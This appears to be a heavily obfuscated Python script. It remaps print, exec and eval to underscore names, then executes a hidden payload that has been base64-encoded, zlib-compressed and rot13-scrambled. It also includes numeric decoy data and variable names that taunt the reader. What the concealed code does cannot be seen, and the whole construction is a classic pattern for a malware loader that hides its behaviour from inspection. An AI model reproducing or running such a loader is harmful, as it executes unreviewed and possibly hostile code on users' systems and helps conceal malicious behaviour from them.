_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='506170 8610796 2930370 2726977 3634338 143530 1681536 663584 864160 1935040 5247900 3896634 1751136 7175470 3094080 10588320 4704378 10789240 4547439 6151607 8791865 7962240 10324470 1501376 3881325 1894202 5693184 9865569 7740714 8220688 2357312 6839509 2973743 8261172 35050 2349260 3765480 4688145 4347141 1063776 7357532 390514 466290 2512352 2311008 1470464 192544 8607375 4544650 7045584 300807 7868048 1455680 979744 1971984 2967510 1667680 857152 4617480 10835110 8071620 10429096 3316818 7081128 537084 1253696 6968934 2124131 7023402 2290158 4036162 8646045 2750824 10550100 82912 672888 2706330 280336 5884794 849006 5095880 5526670 3120704 2893246 989120 7955164 8876789 4708314 968128 6738672 9360408 2627008 3358506 8990280 2343915 3277116 2237200 3884135 50500 824160 3023872 3028832 2239456 8690505 5934080 3950940 6105199 4080608 7805298 308370 2046704 5854755 9038680 1297960 3705117 3765790 10534139 8961835 509691 938818 4033602 8216148 1302720 689955 8298872 885120 1553531 733460 508660 1847730 6748596 3070008 1983315 8044885 9314130 404935 267232 3802416 6876366 8008988 2956305 5033005 2335080 419798 626544 5432689 7711459 8703747 6687816 9214835 4991364 269560 2434128 1410400 4446820 3374898 70094 1632120 3527680 3066460 5089448 2167576 11406628 2595488 5458590 4115100 3127991 562449 618240 2324652 11049273 4392752 9763236 4994379 10939260 3885453 2093842 8614392 7980010 2849608 4342338 10047276 7884842 2172058 5639289 9687819 1866105 4218890 6420136 5256120 1078336 1750048 4070111 2749926 10190716 4697510 1630080 1414040 964010 8380768 2784222 12043372 4842304 553750 2956896 2307808 2336480 1559552 2418114 9073260 3478074 3145958 2925024 9639462 3046580 2056568 2601984 5641423 3289760 5704608 688384 1023855 7084346 4267984 7743138 5064906 10677452 3013792 3253513 1574880 6295275 8649840 9910692 5089900 1671744 8770449 9444720 2342816 7060203 4263720 666950 552352 2291264 1492608 2270496 1379652 10471698 9587292 3605393 1075392 1490730 236325 1497920 6760530 1769070 10543904 2646018 2191992 9167364 311392 602962 3038686 2706976 2096255 10432070 2286840 2949696 5992369 11143500 2696544 2191016 3092620 2237268 7939644 4306438 8642392 7172487 1618842 6242911 345320 2924096 1206272 2111040 2697568 1915812 10544778 8328771 4597570 1036798 1239472 2438520 3150771 4328870 537040 2208560 6664816 1761500 2388960 5884970 2631408 3218582 576076 2347744 386855 3340177 783432 3942831 4356990 2609455 2402542 6614340 7507994 1293002 10371620 2304646 10786376 4503600 7600204 1184560 4288238 8167040 4317600 4733600 10504404 4700073 9131166 188856 1156238 5146848 3323670 6846525 2802136 1905458 1274144 7641960 3197888 1679940 116320 700920 1576896 2516288 1338368 980992 40320 4056642 2199808 2389761 6060840 2916280 5861296 3676470 1465873 4313920 3080500 6166860 8371476 6442137 9376537 2185730 188530 2840416 3054208 373408 1253088 3126208 3068768 1995552 1729536 9748710 1837594 6368761 10585404 426806 6229579 1304200 10288208 170177 1516098 3670 1082624 1349856 529408 2128128 4513005 890766 2258464 366832 9057840 466080 1119328 3945950 1873577 4486977 1800964 1399440 799571 2412612 11137405 2694074 4492042 702480 362112 1788320 2826528 1537408 1482240 875648 1747168 862944 5264084 1489740 3779280 7537920 1059104 3813960 10124688 7708017 7156710 1502560 10362765 5593636 2837688 1565280 8516032 3318650 3434529 1454640 726614 1542002 929798 980802 902816 373547 10597365 2047872 7701351 3077538 2843049 4596090 1229627 3692118 7729155 2346448 4555908 2101200 9099950 10648336 9079644 132520 3513084 5703912 3831081 841115 957390 1050528 1806272 1107520 338016 7164536 6425400 1744270 7484400 708520 5111217 1998640 1815879 1617550 2552440 9807280 2901650 1005771 2029060 7651794 1321686 3684060 1799500 2718120 3337400 1675137 753590 900512 849888 75328 811456 465000 6194633 3791520 3227796 352389 8957536 6474656 5710274 922370 824288 592256 2698176 289632 2846079 647160 993739 8609832 2332480 1479000 1486404 598600 956000 241910';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJxzdHfJdnL3y43KLTCMCvQzdXIvyIrK9cgFAF/xB/E=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
   
                
